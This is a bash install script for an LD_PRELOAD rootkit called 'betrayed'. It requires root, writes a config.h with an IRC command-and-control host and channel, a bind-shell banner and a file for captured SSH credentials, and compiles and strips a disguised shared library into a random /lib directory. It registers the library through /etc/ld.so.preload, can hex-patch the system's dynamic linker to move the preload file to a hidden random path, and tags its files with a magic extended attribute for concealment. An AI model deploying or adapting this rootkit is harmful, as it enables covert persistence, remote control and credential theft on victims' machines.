#!/bin/bash

# nothing to really see here
[ -f .ascii ] && { clear && cat .ascii; }
[ $(id -u) != 0 ] && [ -z $COMPILE_ONLY ] && { echo "  [-] Not root."; exit; }
usage(){ echo "  [..] Usage: $0 irc.host \"#channel\""; exit; }

# if config.h isn't present, we need a host & channel as script args
if [ ! -f config.h ]; then
    [ -z "$1" ] && usage
    [ -z "$2" ] && usage
fi

LDIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")
PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")
LLOCS=() # later stores paths of dynamic linker libraries to patch
[ -z $O_PRELOAD ] && O_PRELOAD="/etc/ld.so.preload"

hstr(){ local hs="`xxd -p <<< "$1"`"; echo -n "${hs::-2}00" | awk '{print toupper($0)}'; }

# `gnpreload` uses this function to seek a home, for the npreload file, two directories deep
grecurdir()
{
    local cpdir="/notarealdir/"
    while [ ! -d "$cpdir" ]; do
        cpdir="${PDIRS[$RANDOM % ${#PDIRS[@]}]}"
        [ ! -d $cpdir ] && continue
        idirs="$(echo `ls -Ud ${cpdir}*/ 2>&1 | head -8`)" # get 1st 8 dirs in curdir, pipe stderr to stdout
        [[ "$idirs" == *"cannot access"* ]] && continue    # if the cur directory doesn't have any dirs in it, go next
        IFS=' ' read -a idir <<< "$idirs" # read the list of files into an array called idir
        cpdir="${idir[$RANDOM % ${#idir[@]}]}" # pick a random directory from the array
    done
    echo -n $cpdir
}

# builds new location string for the preload file.
gnpreload(){ echo -n "`grecurdir`.`cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 8 | head -n 1`"; }

gldlocs()
{
    for clib in ${LDIRS[*]}; do
        if [ -d "$clib" ]; then # lib directory exists
            local xlib="${clib}*" # /DIRECTORY/*
            for l in $xlib; do [[ $l == *"ld-2"* ]] && LLOCS+=($l); done
        fi
    done
}

patch_lib() # $1=target lib,$2=old preload file,$3=new preload file
{
    local HO_PRELOAD="`hstr $2`" # hex our strings
    local HN_PRELOAD="`hstr $3`"
    # the new preload file string needs to be the same length as the old one,
    # so append nullbytes onto the end of it until it's the same length as the old string.
    while [ ${#HN_PRELOAD} != ${#HO_PRELOAD} ]; do HN_PRELOAD+="00"; done
    if [[ "`strings $1`" == *"$2"* ]]; then
        hexdump -ve '1/1 "%.2X"' $1 | sed "s/$HO_PRELOAD/$HN_PRELOAD/g" | xxd -r -p > $1.tmp
        chmod --reference $1 $1.tmp
        mv $1.tmp $1
    fi
}

patch_libdl()
{
	local N_PRELOAD="`gnpreload`" # generate new preload file location
	gldlocs # get full paths of dl libs and store in array
	for x in ${LLOCS[*]}; do patch_lib $x $O_PRELOAD $N_PRELOAD; done
	echo -n $N_PRELOAD # output the new preload file location
}

get_uconfig()
{
	echo "  [..] Configuring rootkit"
	HOST="$1"
	CHANNEL="$2"
	[ -z $NICK ] && NICK="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"
	[ -z $MGID ] && MGID=$(cat /dev/urandom | tr -dc '1-9' | fold -w 5 | head -n 1)
    [ -z $HXATTR_STR ] && HXATTR_STR="$(cat /dev/urandom | tr -dc 'A-Za-z1-9' | fold -w 32 | head -n 1)"
	[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/$NICK.$MGID"
	[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/betrayed_ssh"
	[ -z $HIDDEN_PORTS ] && HIDDEN_PORTS="$INSTALL_DIR/hidden_ports"
	[ -z $SONAME ] && SONAME="`cat /dev/urandom | tr -dc 'A-Za-z1-9' | fold -w 8 | head -n 1`.so.`uname -m`"
	[ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$SONAME"
	#[ -z $COMPILE_ONLY ] && [ -z $LDSP ] && LDSP="$(patch_libdl)"
    [ -z $LDSP ] && LDSP="$O_PRELOAD"
	[ ! -z $COMPILE_ONLY ] && [ -z $LDSP ] && LDSP="$O_PRELOAD"
}

write_uconfig()
{
	local CONFIG_H="
#ifndef CONFIG_H
#define CONFIG_H
#define HOST \"$HOST\"
#define PORT \"6667\"
#define CHANNEL \"$CHANNEL\"
#define NICK \"$NICK\"
#define MGID $MGID
#define HXATTR_STR \"$HXATTR_STR\"
#define INSTALL_DIR \"$INSTALL_DIR\"
#define SSH_LOGS \"$SSH_LOGS\"
#define LDSP \"$LDSP\"
#define S_MSG \"BETRAYED BIND SHELL\\n\"
#define SONAME \"$SONAME\"
#define SOPATH \"$SOPATH\"
#define SEND_TOUT 1
#define BPROC_WAIT 3
#endif
"
	echo "$CONFIG_H" > config.h
}

parse_uconfig()
{
    local nam val
    cp config.h config.h.bak
    sed -i "s/\"//g" config.h.bak
	while read -r line; do
		nam="`echo -n $line | awk '{ print $2 }'`"
		val="`echo -n $line | awk '{ print $3 }'`"
		[ -z $nam ] && [ -z $val ] && continue

		[ "$nam" == "HOST" ] && HOST="$val"
		[ "$nam" == "CHANNEL" ] && CHANNEL="$val"
		[ "$nam" == "NICK" ] && NICK="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
		[ "$nam" == "MGID" ] && MGID=`cat /dev/urandom | tr -dc '1-9' | fold -w 5 | head -n 1`
        [ "$nam" == "HXATTR_STR" ] && HXATTR_STR="$val"
		[ "$nam" == "INSTALL_DIR" ] && INSTALL_DIR="$val"
		[ "$nam" == "SSH_LOGS" ] && SSH_LOGS="$val"
		[ "$nam" == "LDSP" ] && [ ! -z $COMPILE_ONLY ] && LDSP="$val"
        [ "$nam" == "LDSP" ] && [ -z $COMPILE_ONLY ] && LDSP="$(patch_libdl)"
		[ "$nam" == "SOPATH" ] && SOPATH="$val"
		[ "$nam" == "SONAME" ] && SONAME="$val" 
      done <<< "$(cat config.h.bak)"
    rm config.h.bak
}

compile_lib()
{
	echo "  [..] Compiling rootkit"
	rm -rf *.so.*
	local LFLAGS="-ldl"
	local WFLAGS="-Wall"
	local FFLAGS="-fomit-frame-pointer -fPIC"
	gcc -std=gnu99 betrayed.c -O0 $WFLAGS $FFLAGS -shared $LFLAGS -Wl,--build-id=none -o $SONAME
	strip -s $SONAME || { echo "  [-] Couldn't strip lib, exiting."; exit; }
	echo "  [+] Rootkit compiled. ($SONAME $(ls -lhN $SONAME | awk '{ print $5 }'))"
	[ ! -z $COMPILE_ONLY ] && exit
}

install_btrayed()
{
	echo "  [..] Installing & setting up rootkit"
	mkdir -p $INSTALL_DIR
	if [ -d $INSTALL_DIR ]; then
	    mv $SONAME $SOPATH
	    touch $SSH_LOGS && chmod 666 $SSH_LOGS
	    touch $LDSP

        local _="`cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1`"
        setfattr -n user.$HXATTR_STR -v $_ $INSTALL_DIR $SOPATH $SSH_LOGS $LDSP || echo "  [-] Couldn't set extended attributes"

	    echo $SOPATH > $LDSP || { echo "  [-] Couldn't write to $LDSP"; exit; }
	    cat /dev/null # start a process so we can fork straight away
	    echo "  [+] betrayed successfully installed"
	    echo "  [+] See $HOST ($CHANNEL)"
	fi
}

if [ -f config.h ]; then
    echo "  [..] config.h already exists, using existing settings"
    parse_uconfig
else
    get_uconfig $1 $2
    write_uconfig
    echo "  [+] config.h created"
fi


echo "  [+] Host: $HOST"
echo "  [+] Channel: $CHANNEL"
echo "  [+] Nick: $NICK"
echo "  [+] Magic GID: $MGID"

compile_lib
install_btrayed
